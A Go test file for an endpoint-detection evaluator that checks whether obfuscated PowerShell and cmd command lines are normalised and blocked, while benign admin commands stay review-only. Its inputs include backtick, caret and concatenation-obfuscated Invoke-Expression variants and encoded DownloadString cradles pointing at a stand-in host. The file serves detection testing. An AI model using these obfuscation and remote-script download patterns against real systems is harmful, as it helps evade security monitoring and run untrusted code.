// STATUS: DIAMANT VGT SUPREME
package mhx

import (
	"strings"
	"testing"
)

func TestNormalizeBehaviorTextDefeatsObfuscation(t *testing.T) {
	cases := []struct {
		name  string
		input string
		want  string
	}{
		{name: "backtick escape", input: "Invoke-Ex`pression 'x'", want: " invoke-expression "},
		{name: "caret escape", input: "Invoke-Ex^pression", want: " invoke-expression "},
		{name: "double quoted concatenation", input: `"Invoke-"+"Expression"`, want: " invoke-expression "},
		{name: "single quoted concatenation", input: `& ('ie'+'x') ('Get-Date')`, want: " iex "},
		{name: "spaced concatenation", input: `"In" + "voke-Expression"`, want: " invoke-expression "},
		{name: "punctuation boundaries", input: `IEX(New-Object System.Net.WebClient)`, want: " iex "},
		{name: "mixed case", input: `INVOKE-EXPRESSION`, want: " invoke-expression "},
		{name: "backtick download string", input: "Down`loadString", want: " downloadstring "},
		{name: "concatenated download string", input: `"Down"+"loadString"`, want: " downloadstring "},
		{name: "nested literal concatenation", input: `"& ('ie'+'x')"`, want: " iex "},
		{name: "whitespace collapsed", input: "  A\t\tB\r\nC  ", want: " a b c "},
	}
	for _, testCase := range cases {
		normalized := normalizeBehaviorText(testCase.input)
		if !strings.Contains(normalized, testCase.want) {
			t.Fatalf("%s: normalizeBehaviorText(%q) = %q, want substring %q", testCase.name, testCase.input, normalized, testCase.want)
		}
	}
}

func TestNormalizeBehaviorTextKeepsBenignPathsIntact(t *testing.T) {
	normalized := normalizeBehaviorText(`Get-Content C:\logs\iex.log -Tail 10`)
	if strings.Contains(normalized, " iex ") {
		t.Fatalf("benign path produced a standalone iex token: %q", normalized)
	}
	if !strings.Contains(normalized, `c:\logs\iex.log`) {
		t.Fatalf("benign path was reshaped: %q", normalized)
	}
}

func TestBacktickObfuscatedInvokeExpressionIsBlocked(t *testing.T) {
	event := ProcessEvent{
		Image:        "powershell.exe",
		ImagePath:    `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		CommandLine:  `powershell.exe -NoProfile -Command "& {Invoke-Ex` + "`" + `pression 'Write-Output VGT_OBFUSCATION'}"`,
		SignerStatus: "Valid",
	}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionBlock || !containsSignal(result.Signals, "lolbin.dynamic-execution") {
		t.Fatalf("backtick-obfuscated Invoke-Expression escaped: %+v", result)
	}
}

func TestQuotedConcatenationObfuscationIsBlocked(t *testing.T) {
	cases := []string{
		`powershell.exe -NoProfile -Command "& ('Invoke-'+'Expression') ('Write-Output VGT_OBFUSCATION')"`,
		`powershell.exe -NoProfile -Command "& ('ie'+'x') ('Write-Output VGT_OBFUSCATION')"`,
		`powershell.exe -NoProfile -Command "& ('In'+'voke-Expression') ('Write-Output VGT_OBFUSCATION')"`,
		// Real process telemetry carries inner double quotes backslash-escaped.
		`powershell.exe -NoProfile -Command "& \"ie\"+\"x\" ('Write-Output VGT_OBFUSCATION')"`,
	}
	for _, commandLine := range cases {
		event := ProcessEvent{
			Image:        "powershell.exe",
			ImagePath:    `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
			CommandLine:  commandLine,
			SignerStatus: "Valid",
		}
		result := (Evaluator{}).Analyze(event)
		if result.Disposition != DispositionBlock || !containsSignal(result.Signals, "lolbin.dynamic-execution") {
			t.Fatalf("quoted concatenation %q escaped: %+v", commandLine, result)
		}
	}
}

func TestMixedCaseObfuscationIsBlocked(t *testing.T) {
	event := ProcessEvent{
		Image:        "powershell.exe",
		ImagePath:    `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		CommandLine:  `powershell.exe -NoProfile -Command "InVoKe-ExPrEsSiOn 'Write-Output VGT_OBFUSCATION'"`,
		SignerStatus: "Valid",
	}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionBlock || !containsSignal(result.Signals, "lolbin.dynamic-execution") {
		t.Fatalf("mixed-case Invoke-Expression escaped: %+v", result)
	}
}

func TestCaretObfuscationIsBlocked(t *testing.T) {
	event := ProcessEvent{
		Image:        "cmd.exe",
		ImagePath:    `C:\Windows\System32\cmd.exe`,
		CommandLine:  `cmd.exe /c "powershell -NoProfile -Command Invoke-Ex^pression 'Write-Output VGT_OBFUSCATION'"`,
		SignerStatus: "Valid",
	}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionBlock || !containsSignal(result.Signals, "lolbin.dynamic-execution") {
		t.Fatalf("caret-obfuscated Invoke-Expression escaped: %+v", result)
	}
}

func TestInlineEncodedObfuscatedPayloadIsSuspicious(t *testing.T) {
	payload := "Invoke-Ex`pression 'Write-Output VGT_OBFUSCATION'"
	event := ProcessEvent{
		Image:        "powershell.exe",
		ImagePath:    `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		CommandLine:  "powershell.exe -NoProfile -e:" + encodedUTF16LE(payload),
		SignerStatus: "Valid",
	}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionBlock || result.Classification != "SUSPICIOUS" {
		t.Fatalf("obfuscated inline encoded payload was not classified: %+v", result)
	}
	if !containsSignal(result.Signals, "payload.invoke-expression") {
		t.Fatalf("obfuscated payload signal missing: %#v", result.Signals)
	}
	if !result.ResponseAuthority {
		t.Fatalf("suspicious encoded command must authorize host response: %#v", result.Signals)
	}
}

func TestEncodedObfuscatedPayloadContentIsSuspicious(t *testing.T) {
	payloads := []string{
		"Down`loadString http://example.invalid/a.ps1",
		`& ("Down"+"loadString")('http://example.invalid/a.ps1')`,
	}
	for _, payload := range payloads {
		event := ProcessEvent{
			Image:        "powershell.exe",
			ImagePath:    `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
			CommandLine:  "powershell.exe -EncodedCommand " + encodedUTF16LE(payload),
			SignerStatus: "Valid",
		}
		result := (Evaluator{}).Analyze(event)
		if result.Disposition != DispositionBlock || result.Classification != "SUSPICIOUS" {
			t.Fatalf("obfuscated payload %q was not classified: %+v", payload, result)
		}
		if !containsSignal(result.Signals, "payload.downloadstring") {
			t.Fatalf("obfuscated payload %q signal missing: %#v", payload, result.Signals)
		}
	}
}

func TestBenignAdminCommandLinesRemainReviewOnly(t *testing.T) {
	cases := []struct {
		name            string
		image           string
		imagePath       string
		commandLine     string
		wantDisposition Disposition
		wantClass       string
	}{
		{
			name:            "execution policy bypass alone",
			image:           "powershell.exe",
			imagePath:       `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
			commandLine:     `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Get-Date`,
			wantDisposition: DispositionAudit,
			wantClass:       "REVIEW ONLY",
		},
		{
			name:            "quoted path with spaces",
			image:           "powershell.exe",
			imagePath:       `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
			commandLine:     `powershell.exe -NoProfile -Command "Get-ChildItem 'C:\Program Files' | Sort-Object Name"`,
			wantDisposition: DispositionAudit,
			wantClass:       "UNCLASSIFIED",
		},
		{
			name:            "path containing iex",
			image:           "powershell.exe",
			imagePath:       `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
			commandLine:     `powershell.exe -NoProfile -Command "Get-Content C:\logs\iex.log -Tail 10"`,
			wantDisposition: DispositionAudit,
			wantClass:       "UNCLASSIFIED",
		},
		{
			name:            "caret escaped ampersand echo",
			image:           "cmd.exe",
			imagePath:       `C:\Windows\System32\cmd.exe`,
			commandLine:     `cmd.exe /c "echo hello ^& whoami"`,
			wantDisposition: DispositionAudit,
			wantClass:       "UNCLASSIFIED",
		},
	}
	for _, testCase := range cases {
		event := ProcessEvent{Image: testCase.image, ImagePath: testCase.imagePath, CommandLine: testCase.commandLine, SignerStatus: "Valid"}
		result := (Evaluator{}).Analyze(event)
		if result.Disposition != testCase.wantDisposition || result.Classification != testCase.wantClass {
			t.Fatalf("%s: benign command was escalated: %+v", testCase.name, result)
		}
	}
}
